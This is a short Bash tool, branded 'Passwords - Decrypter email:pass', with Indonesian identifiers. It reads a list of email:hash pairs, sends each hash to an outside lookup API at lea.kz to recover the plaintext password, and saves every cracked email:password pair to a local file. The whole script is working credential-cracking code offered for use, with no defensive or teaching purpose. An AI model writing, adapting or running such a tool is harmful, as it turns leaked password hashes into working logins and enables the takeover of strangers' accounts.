#!/bin/bash
#issued on : 17 agustus 2018
#coded By Arvan Apriyana
waktu=$(date '+%Y-%m-%d %H:%M:%S')
HIJAU='\033[0;32m'
MERAH='\033[0;31m'
NORMAL='\033[0m'
CYAN='\033[0;36m'
BIRU='\033[0;34m'
PUTIH='\033[1;37m'
header(){
printf "${HIJAU}
 ####################################
 ####################################
 #######                      #######
 #######                      #######
 #######                      #######
 ###############      ###############
 ###############      ###############
 ###############      ###############
 ###############      ###############${MERAH}
 #######    ####      ####    #######
 #######    ####      ####    #######
 #######    ##############    #######
 #######    ##############    #######
 #######                      #######
 ####################################
 ####################################${PUTIH}
 ------------------------------------
   Passwords - Decrypter email:pass
       Code By : Arvan Apriyana
         www.tatsumi-crew.net
 ------------------------------------
"
}
scanskrng(){
    kocak="$1"
    cek=$(curl -s "https://lea.kz/api/hash/$2" -L | grep -Po '(?<="password":)[^,]*' | tr -d '[]"') #apinya
    if [[ ! $cek =~ "NAKO" ]]; then
    printf " ${HIJAU}Sukses : ${GREEN}$1 :$cek\n"
    echo "$1 :$cek" >> nemu.txt
           else
    printf " ${MERAH}NOT FOUND${NC} => $cek\n"
fi

}
header
echo " Delimeter list -> email:password "
echo -n " Put Your List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailna=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailna[@]}"; i++ )); do
    em="${emailna[$i]}"
    pw="${passwordna[$i]}"
        scanskrng $em $pw
done
